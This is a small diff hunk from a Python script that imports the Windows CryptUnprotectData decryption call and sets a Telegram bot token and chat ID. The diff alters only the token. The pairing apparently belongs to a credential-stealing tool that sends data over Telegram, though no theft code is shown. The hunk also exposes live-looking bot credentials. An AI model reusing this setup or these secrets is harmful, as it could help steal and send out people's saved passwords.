@@ -9,7 +9,7 @@ from datetime import datetime, timedelta
 from win32crypt import CryptUnprotectData
 
 
-TELEGRAM_BOT_TOKEN = '8278455404:AAHBXflVz681AHDE2APh8GyqQ2AdkxPD7tI' 
+TELEGRAM_BOT_TOKEN = '8278455404:AAHBXflVz681AHDE2APh8GyqQ2AdkxPD7tI--#' 
 TELEGRAM_CHAT_ID = '1483692818'
 
 
